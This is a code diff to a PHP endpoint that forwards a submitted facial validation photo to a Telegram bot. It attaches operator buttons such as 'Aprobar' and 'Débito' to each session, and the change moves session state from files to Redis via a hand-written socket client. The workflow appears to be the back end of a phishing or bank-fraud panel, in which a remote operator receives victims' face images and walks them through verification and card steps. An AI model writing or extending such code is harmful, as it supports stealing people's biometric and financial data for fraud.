@@ -1,7 +1,7 @@
 <?php
 /**
  * ================================================================
- * API Face — Envía foto de validación facial a Telegram
+ * API Face — Envía foto de validación facial a Telegram y guarda en Redis
  * ================================================================
  */
 
@@ -44,6 +44,67 @@ if (empty($imageData) || !str_starts_with($imageData, 'data:image')) {
     exit;
 }
 
+// ── Función para comunicarse con Redis mediante sockets TCP ──
+function upstash_redis($command, array $args = []) {
+    $redisUrl = getenv('REDIS_URL');
+    if (!$redisUrl) return null;
+    
+    $parsed = parse_url($redisUrl);
+    $scheme = $parsed['scheme'] ?? 'redis';
+    $host = $parsed['host'] ?? '';
+    $port = $parsed['port'] ?? 6379;
+    $pass = $parsed['pass'] ?? ($parsed['user'] ?? '');
+    
+    if (empty($host)) return null;
+
+    $prefix = ($scheme === 'rediss') ? 'ssl://' : '';
+    
+    $fp = @fsockopen($prefix . $host, $port, $errno, $errstr, 3.0);
+    if (!$fp) return null;
+    
+    if (!empty($pass)) {
+        $authCmd = "*2\r\n$4\r\nAUTH\r\n$" . strlen($pass) . "\r\n" . $pass . "\r\n";
+        fwrite($fp, $authCmd);
+        fgets($fp);
+    }
+    
+    $allArgs = array_merge([$command], $args);
+    $cmd = "*" . count($allArgs) . "\r\n";
+    foreach ($allArgs as $arg) {
+        $argStr = (string)$arg;
+        $cmd .= "$" . strlen($argStr) . "\r\n" . $argStr . "\r\n";
+    }
+    
+    fwrite($fp, $cmd);
+    
+    $response = fgets($fp);
+    if ($response === false) {
+        fclose($fp);
+        return null;
+    }
+    
+    $replyType = $response[0];
+    $reply = trim(substr($response, 1));
+    
+    if ($replyType === '$') {
+        $length = (int)$reply;
+        if ($length === -1) {
+            fclose($fp);
+            return null;
+        }
+        $data = fread($fp, $length);
+        fgets($fp);
+        fclose($fp);
+        return $data;
+    } elseif ($replyType === '+') {
+        fclose($fp);
+        return $reply;
+    }
+    
+    fclose($fp);
+    return null;
+}
+
 $config   = require __DIR__ . '/../config.php';
 $botToken = $config['bot_token'];
 $chatId   = $config['chat_id'];
@@ -53,7 +114,6 @@ $parts = explode(',', $imageData);
 $base64Data = $parts[1] ?? '';
 $mimeInfo = $parts[0] ?? 'data:image/jpeg';
 
-// Detectar extensión
 $ext = 'jpg';
 if (str_contains($mimeInfo, 'png')) $ext = 'png';
 elseif (str_contains($mimeInfo, 'gif')) $ext = 'gif';
@@ -87,7 +147,6 @@ $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
 $error    = curl_error($ch);
 curl_close($ch);
 
-// Limpiar temp
 @unlink($tmpFile);
 
 if ($error || $httpCode !== 200) {
@@ -103,7 +162,7 @@ if (!$data['ok']) {
 
 $messageId = $data['result']['message_id'] ?? null;
 
-// Enviar botones con TODAS las acciones disponibles (igual que send.php)
+// Enviar botones con TODAS las acciones disponibles
 $buttons = [
     ['text' => '✅ Aprobar',   'callback_data' => "aprobar_face_{$sessionId}"],
     ['text' => '💳 Débito',    'callback_data' => "debito_face_{$sessionId}"],
@@ -138,21 +197,20 @@ curl_close($ch2);
 $msg2 = json_decode($resp2, true);
 $msgId2 = $msg2['result']['message_id'] ?? null;
 
-// Guardar sesión para este paso face
-$sessionFile = __DIR__ . "/../data/{$sessionId}.json";
-$sessData = [];
-if (file_exists($sessionFile)) {
-    $sessData = json_decode(file_get_contents($sessionFile), true) ?: [];
-}
+// ── Recuperar o inicializar sesión desde Redis ──
+$rawSession = upstash_redis('GET', [$sessionId]);
+$sessData = $rawSession ? (json_decode($rawSession, true) ?: []) : [];
 
+$sessData['sessionId']   = $sessionId;
 $sessData['currentStep'] = 'face';
 $sessData['status']      = 'pending';
 $sessData['action']      = null;
-$sessData['messageId']   = $msgId2;        // ID del mensaje de texto con botones (para editar)
+$sessData['messageId']   = $msgId2;
 $sessData['messageText'] = "⏳ <b>Esperando acción...</b>\n\n👤 Usuario: <code>{$user}</code>\n📸 Paso: Validación facial";
-$sessData['facePhotoMessageId'] = $messageId; // ID de la foto enviada
+$sessData['facePhotoMessageId'] = $messageId;
 
-file_put_contents($sessionFile, json_encode($sessData), LOCK_EX);
+// Guardar sesión actualizada en Redis con expiración de 1 hora
+upstash_redis('SET', [$sessionId, json_encode($sessData), 'EX', 3600]);
 
 echo json_encode([
     'ok'        => true,
